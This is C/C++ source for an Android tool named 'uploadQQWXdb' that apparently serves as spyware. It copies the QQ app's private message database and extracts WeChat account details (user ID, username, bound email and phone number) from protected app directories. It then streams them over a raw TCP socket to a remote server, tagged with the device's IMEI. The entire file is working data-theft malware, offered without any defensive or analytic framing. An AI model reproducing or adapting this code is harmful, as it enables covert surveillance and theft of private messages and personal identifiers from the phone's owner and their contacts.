#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <stdint.h>
#include <err.h>
#include <errno.h>
#include <assert.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <limits.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <android/log.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <time.h>
#include <dirent.h>

#include "public.h"

#define LOG_TAG					"uploadQQWXdb"

int GetQQDataBaseFile(char * dstfilename,char * dbname)
{
	DIR *dir;
	struct dirent *ptr;
	char folder[256] = {0};

	char szqqdatabasedir[] = "/data/data/com.tencent.mobileqq/databases/";
	if ((dir=opendir(szqqdatabasedir)) == NULL)
	{
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetQQDataBaseFile open dir error");
		printf("GetQQDataBaseFile Open dir error\r\n");
		perror("reason:");
		return -1;
	}

	while ((ptr=readdir(dir)) != NULL)
	{
		if(ptr->d_type == 8){
			if(memcmp( ptr->d_name + strlen(ptr->d_name) - 3,".db",3) == 0){
				int i = 0;
				for(i = 0; i < strlen(ptr->d_name) - strlen(".db"); i ++){
					if(ptr->d_name[i] >= '0' && ptr->d_name[i] <= '9'){
						continue;
					}else{
						break;
					}
				}

				if(i == strlen(ptr->d_name) - strlen(".db")){
					strcpy(dstfilename,szqqdatabasedir);
					strcat(dstfilename,ptr->d_name);
					strcpy(dbname,ptr->d_name);
					__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find qq database file:%s",ptr->d_name);
					printf("find qq database file:%s\r\n",dstfilename);
					closedir(dir);
					return 0;
				}else{
					continue;
				}
			}
		}
		else if(ptr->d_type == 4)
		{
			if( strcmp(ptr->d_name,"..") == 0 || strcmp(ptr->d_name,".") == 0){
				continue;
			}else{
				//strcpy(folder,szqqdatabasedir);
				//strcat(folder,ptr->d_name);
				//strcat(folder,"/");
				//GetQQDataBaseFile(dstfilename,dbname);
			}
		}
	}
	closedir(dir);
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"not find qq database file");
	printf("not find qq database file\r\n");
	return -1;
}




extern "C" int GetAndSendQQDataBase(char* ip,int port,char* clientimei,char* logfile,char * clientname)
{
	char szqqdatabasefile[256] = {0};
	char szdbfilename[256] = {0};
	int ret = GetQQDataBaseFile(szqqdatabasefile,szdbfilename);
	if(ret < 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"not found qq data base file");
		printf("not found qq data base file\r\n");
		return -1;
	}

	int fd = open(szqqdatabasefile,O_RDONLY);
	if(fd <= 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase open error");
		printf("GetAndSendQQDataBase open error\r\n");
		return -1;
	}
	struct stat fstate;
	ret = fstat(fd,&fstate);
	if(ret <0){
		close(fd);
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase fstat error");
		printf("GetAndSendQQDataBase fstat error\r\n");
		return -1;
	}

	char * buf = new char [NETWORK_DATABUF_SIZE];
	int size = 0;
	*(int*)(buf + size) = 0;
	size += sizeof(int);
	*(int*)(buf + size) = CMD_QQDATABASEFILE;
	size += sizeof(int);
	*(int *)(buf + size) = 0;		//no cryption or decompress
	size += sizeof(int);
	memmove(buf + size,clientimei,IMEI_IMSI_PHONE_SIZE);
	size += IMEI_IMSI_PHONE_SIZE;
	memmove(buf + size,clientname,IMEI_IMSI_PHONE_SIZE);
	size += IMEI_IMSI_PHONE_SIZE;

	int dbfnlen = strlen(szdbfilename);
	int dblen = fstate.st_size;

	*(int *)(buf + size) = dbfnlen;
	//memmove(buf + size,&dbfnlen,4);
	size += 4;
	memmove(buf + size,szdbfilename,dbfnlen);
	size += dbfnlen;
	*(int *)(buf + size) = dblen;
	//memmove(buf + size,&dblen,4);
	size += 4;
	*(int*)(buf + 0) = (size + dblen);


	struct sockaddr_in remote_addr = {0};
	remote_addr.sin_family=AF_INET;
	remote_addr.sin_addr.s_addr=inet_addr(ip);
	remote_addr.sin_port=__ntohs(port);


	int s=socket(AF_INET,SOCK_STREAM,0);
	if(s<0)
	{
		close(fd);
		delete [] buf;

		writeLog(logfile,"qqdb socket error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"qqdb socket error");
		perror("qqdb socket error");
		return ret;
	}

	ret = connect(s,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr));
	if(ret<0)
	{
		close(fd);
		delete [] buf;

		ret = close(s);
		writeLog(logfile,"qqdb connect error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"qqdb connect error");
		perror("qqdb connect error");
		return ret;
	}


	ret = send(s,buf,size,0);
	if(ret <= 0){
		close(fd);
		delete [] buf;

		ret = close(s);
		writeLog(logfile,"send qqdb error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"send qqdb error");
		perror("send qqdb error");
		return ret;
	}


	int sendtimes = dblen / NETWORK_DATABUF_SIZE;
	int sendmod = dblen % NETWORK_DATABUF_SIZE;
	for(int i = 0;i < sendtimes; i ++){
		ret = read(fd,buf,NETWORK_DATABUF_SIZE);
		ret = send(s,buf,NETWORK_DATABUF_SIZE,0);
	}

	if(sendmod){
		ret = read(fd,buf,sendmod);
		ret = send(s,buf,sendmod,0);
	}

	ret = close(s);
	ret = close(fd);
	delete [] buf;

	writeLog(logfile,"send qqdb ok\r\n");
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"send qqdb ok");
	perror("send qqdb ok");
	return 0;
}




extern "C" int GetAndSendQQDataBase_old(char* ip,int port,char* clientimei,char* logfile,char * clientname) {

	char szqqdatabasefile[256] = {0};
	char szdbfilename[256] = {0};
	int ret = GetQQDataBaseFile(szqqdatabasefile,szdbfilename);
	if(ret < 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"not found qq data base file");
		printf("not found qq data base file\r\n");
		return -1;
	}

	int fd = open(szqqdatabasefile,O_RDONLY);
	if(fd <= 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase open error");
		printf("GetAndSendQQDataBase open error\r\n");
		return -1;
	}
	struct stat fstate;
	ret = fstat(fd,&fstate);
	if(ret <0){
		close(fd);
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase fstat error");
		printf("GetAndSendQQDataBase fstat error\r\n");
		return -1;
	}

	int dbfnlen = strlen(szdbfilename);
	int dblen = fstate.st_size;
	char * senddata = new char[ 4 + dbfnlen + 4 + dblen];
	int offset = 0;
	memmove(senddata + offset,&dbfnlen,4);
	offset += 4;
	memmove(senddata + offset,szdbfilename,dbfnlen);
	offset += dbfnlen;
	memmove(senddata + offset,&dblen,4);
	offset += 4;

	ret = read(fd,senddata + offset,dblen);
	close(fd);

	if(ret != dblen){
		delete []senddata;
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase read error");
		printf("GetAndSendQQDataBase read error\r\n");
		return -1;
	}

	ret = sendDataToServer(senddata,4 + dbfnlen + 4 + dblen,CMD_QQDATABASEFILE,logfile,ip,port,clientimei,clientname);
	delete []senddata;
	if(ret != 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase send error");
		printf("GetAndSendQQDataBase send error\r\n");
		return -1;
	}else{
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetAndSendQQDataBase send ok");
		printf("GetAndSendQQDataBase send ok\r\n");
		return 0;
	}
}





extern "C" int GetWeiXinUserInfo(char* ip,int port,char* clientimei,char* logfile,char * clientname,char * path) {
	char uin[256] = {0};
	char srcuin[256] = {0};
	char wxid[256] = {0};
	char username[256] = {0};
	char email[256] = {0};
	char phone[256] = {0};

	char szwxuserinfofile[] = "/data/data/com.tencent.mm/shared_prefs/com.tencent.mm_preferences.xml";
	int fdpref = open(szwxuserinfofile,O_RDONLY);
	if(fdpref < 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetWeiXinUserInfo open preferences file error");
		printf("GetWeiXinUserInfo open preferences file error\r\n");
		return -1;
	}
	struct stat fstate;
	int ret = fstat(fdpref,&fstate);
	if(ret < 0){
		close(fdpref);
		printf("GetWeiXinUserInfo fstat error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetWeiXinUserInfo fstat error");
		return -1;
	}

	char * prefdata = new char[fstate.st_size + 1024];
	ret = read(fdpref,prefdata,fstate.st_size);
	close(fdpref);
	if(ret != fstate.st_size){
		delete [] prefdata;
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"GetWeiXinUserInfo read error");
		printf("GetWeiXinUserInfo read error\r\n");
		return -1;
	}

	*(prefdata + fstate.st_size) = 0;
	char * hdr = strstr(prefdata,"\"last_login_uin\">");
	if(hdr != 0){
		hdr = hdr + strlen("\"last_login_uin\">");
		char * end = strstr(hdr,"<");
		if(end != 0 && end - hdr < 256){
			memmove(srcuin,hdr,end - hdr);
		}
	}

	hdr = strstr(prefdata,"\"login_user_name\">");
	if(hdr != 0){
		hdr = hdr + strlen("\"login_user_name\">");
		char * end = strstr(hdr,"<");
		if(end != 0 && end - hdr < 256){
			memmove(username,hdr,end - hdr);
		}
	}

	hdr = strstr(prefdata,"\"login_weixin_username\">");
	if(hdr != 0){
		hdr = hdr + strlen("\"login_weixin_username\">");
		char * end = strstr(hdr,"<");
		if(end != 0 && end - hdr < 256){
			memmove(wxid,hdr,end - hdr);
		}
	}

	hdr = strstr(prefdata,"\"last_login_bind_email\">");
	if(hdr != 0){
		hdr = hdr + strlen("\"last_login_bind_email\">");
		char * end = strstr(hdr,"<");
		if(end != 0 && end - hdr < 256){
			memmove(email,hdr,end - hdr);
		}
	}

	hdr = strstr(prefdata,"\"last_login_bind_mobile\">");
	if(hdr != 0){
		hdr = hdr + strlen("\"last_login_bind_mobile\">");
		char * end = strstr(hdr,"<");
		if(end != 0 && end - hdr < 256){
			memmove(phone,hdr,end - hdr);
		}
	}

	delete [] prefdata;
	int nuin = 0;
	sscanf(srcuin,"%d",&nuin);
	sprintf(uin,"%d",nuin);
	char szwxuserinfo[1024];
	int userinfolen = sprintf(szwxuserinfo,"uin:%s\r\nwxid:%s\r\nusername:%s\r\nemail:%s\r\nphone:%s\r\n",uin,wxid,username,email,phone);
	ret = sendDataToServer(szwxuserinfo,userinfolen,CMD_WEIXINUSERINFO,logfile,ip,port,clientimei,clientname);

	/*
	char szsdwxuserinfo[256];
	strcpy(szsdwxuserinfo,logfile);
	for(int i = strlen(szsdwxuserinfo);i > 0; i--){
		if(szsdwxuserinfo[i] == '/'){

			szsdwxuserinfo[i+1] = 0;
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"sdcard path:%s",szsdwxuserinfo);
			strcat(szsdwxuserinfo,"weixinuserinfo.txt");
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"weixinuserinfo path:%s",szsdwxuserinfo);
			break;
		}
	}
	*/

	char wxinfofn[256];
	strcpy(wxinfofn,path);
	strcat(wxinfofn,"weixinuserinfo.txt");		//"/sdcard/appData/weixinuserinfo.txt"
	int fdwxinfo = open(wxinfofn,O_RDWR | O_CREAT ,S_IRWXU | S_IRWXG | S_IRWXO);
	if(fdwxinfo <= 0){
	  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"weixinuserinfo open file error");
	  return -1;
	}

	int writesize = write(fdwxinfo,szwxuserinfo,userinfolen);
	close(fdwxinfo);
	if(writesize != userinfolen){
	  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"weixinuserinfo write file error");
	  return -1;
	}

	return 0;
}







int main(int argc,char ** argv){
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb start");
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb ip:%s",argv[1]);
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb port:%d",atoi(argv[2]));
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb imei:%s",argv[3]);
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb logfile:%s",argv[4]);
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb username:%s",argv[5]);

	int qqret = GetAndSendQQDataBase(argv[1],atoi(argv[2]),argv[3],argv[4],argv[5]);

	char szwxinfopath[256] = {0};
	int ret = getPathFormFullName(argv[4],szwxinfopath) ;
	int wxret= GetWeiXinUserInfo(argv[1],atoi(argv[2]),argv[3],argv[4],argv[5],szwxinfopath);




	/*
	FILE* fp=fopen(argv[1],"rb");
	if(fp <= 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb open cmd file error");
		printf("uploadQQWXdb cmd file open error\r\n");
		return -1;
	}else{
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb open cmd file ok");
		printf("uploadQQWXdb cmd file open ok\r\n");
	}

	int ret = fseek(fp,0,2);
	int filesize = ftell(fp);
	ret = fseek(fp,0,0);

	char * lpcmd=new char[filesize + 1024];

	ret = fread(lpcmd,1,filesize,fp);
	fclose(fp);
	if(ret <= 0){
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb read cmd file error");
		printf("uploadQQWXdb cmd file read error\r\n");
		return -1;
	}else{
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"uploadQQWXdb read cmd file ok");
		printf("uploadQQWXdb cmd file read ok\r\n");
	}

	*(lpcmd + filesize) = 0;

	char szip[256] = {0};
	char szport[256] = {0};
	char szimei[256] = {0};
	char szlogfile[256]= {0};
	char szclientname[256] = {0};

	char * hdr = strstr(lpcmd,"ip:");
	char * end = hdr;
	if(hdr){
		hdr += strlen("ip:");
		end = strstr(hdr,"\r\n");
		if(end){
			memmove(szip,hdr,end-hdr);
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find ip:%s",szip);
		}
	}

	hdr = strstr(lpcmd,"port:");
	end = hdr;
	if(hdr){
		hdr += strlen("port:");
		end = strstr(hdr,"\r\n");
		if(end){
			memmove(szport,hdr,end-hdr);
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find port:%s",szport);
		}
	}

	hdr = strstr(lpcmd,"imei:");
	end = hdr;
	if(hdr){
		hdr += strlen("imei:");
		end = strstr(hdr,"\r\n");
		if(end){
			memmove(szimei,hdr,end-hdr);
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find imei:%s",szimei);
		}
	}

	hdr = strstr(lpcmd,"logfile:");
	end = hdr;
	if(hdr){
		hdr += strlen("logfile:");
		end = strstr(hdr,"\r\n");
		if(end){
			memmove(szlogfile,hdr,end-hdr);
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find logfile:%s",szlogfile);
		}
	}

	hdr = strstr(lpcmd,"clientuser:");
	end = hdr;
	if(hdr){
		hdr += strlen("clientuser:");
		end = strstr(hdr,"\r\n");
		if(end){
			memmove(szclientname,hdr,end-hdr);
			__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"find username:%s",szclientname);
		}
	}

	delete [] lpcmd;
	int port = atoi(szport);

	int qqret = GetAndSendQQDataBase(szip,port,szimei,szlogfile,szclientname);

	char szwxinfopath[256] = {0};
	ret = getPathFormFullName(argv[1],szwxinfopath) ;
	int wxret= GetWeiXinUserInfo(szip,port,szimei,szlogfile,szclientname,szwxinfopath);

	return qqret|wxret;
	*/
}
